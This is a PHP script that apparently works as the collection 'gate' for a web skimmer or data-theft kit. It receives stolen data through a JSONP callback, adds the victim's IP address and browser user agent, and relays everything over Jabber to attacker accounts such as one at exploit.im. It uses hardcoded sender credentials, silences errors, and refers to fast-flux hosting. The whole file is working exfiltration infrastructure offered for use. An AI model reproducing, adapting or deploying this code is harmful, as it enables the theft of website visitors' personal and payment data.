<?php 


//get real ip for Fat flux
function get_ip_address(){
foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key)
{
if (array_key_exists($key, $_SERVER) === true){
foreach (explode(',', $_SERVER[$key]) as $ip){
$ip = trim($ip); // just to be safeif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
{
return $ip;}}}}};$_SERVER['REMOTE_ADDR']= get_ip_address();

$ip = $_SERVER['REMOTE_ADDR'];
$ua=$_SERVER['HTTP_USER_AGENT'];
ini_set("display_errors",0);
error_reporting(0);
ignore_user_abort(true);
set_time_limit(30);
require_once('inc/class.jabber.php');





/*
  Jabber arrays of kjabbrs to revive notify
*/
$jabbers_to_recive=array(
	"-50-@exploit.im"
);




define('jabber_user_name',      'kontrolna'                 );      //gate sender jabber name
define('jabber_password',       'maikati'       );      //gate sender jabber password
define('jabber_host',           'jabber.ru'                       );      //gate sender jabber host
define('jaber_port',            5222                            );      //gate sender jabber port
define('def_jabber_to_recive',           'test@jabber.org'     );      //your jabber
$send_method= 'jabber'; // jabber, icq, none




function send_jabber($m,$jabber_to_recive=def_jabber_to_recive)
{
        $m=utf8_encode(urldecode(str_replace('%C2%A3','',urlencode($m))));
		$JABBER = new Jabber;
        $JABBER->server   = jabber_host;
        $JABBER->port     =     jaber_port;
        $JABBER->username = jabber_user_name;
        $JABBER->password = jabber_password;
        $JABBER->resource = 'ClassJabberPHP';
        $JABBER->Connect() or die('No CONNECT');
        $JABBER->SendAuth() or die('Error login');
        $JABBER->SendPresence(NULL,NULL,'online');
        $JABBER->SendMessage($jabber_to_recive, 'chat', NULL, array( 'body' => "EXO-Des Data:\n".$m));
        $JABBER->Disconnect();
};			

function send_notify($m){
	global $jabbers_to_recive;
	foreach($jabbers_to_recive as $jabber){
		send_jabber($m,$jabber);
	};
};

		
 if(isset($_GET['callback'])){ 
 
	  header('Content-Type: text/javascript');
      $cb=$_GET['callback'];
      $data=$_GET['data'];
      $data=json_decode($data);
      $string='';
	  //inject data
	    $data->ip=$ip;
	    $data->userAgent=$ua;
	  //
	 
        foreach($data as $key=>$val){
         	$string.=$key."=".$val."\n";
        };
		$obj=new stdClass();
		$obj->conect="OK";
        echo $cb.'('.json_encode($obj).')';
	    send_notify($string);
 };
			
				
				
?>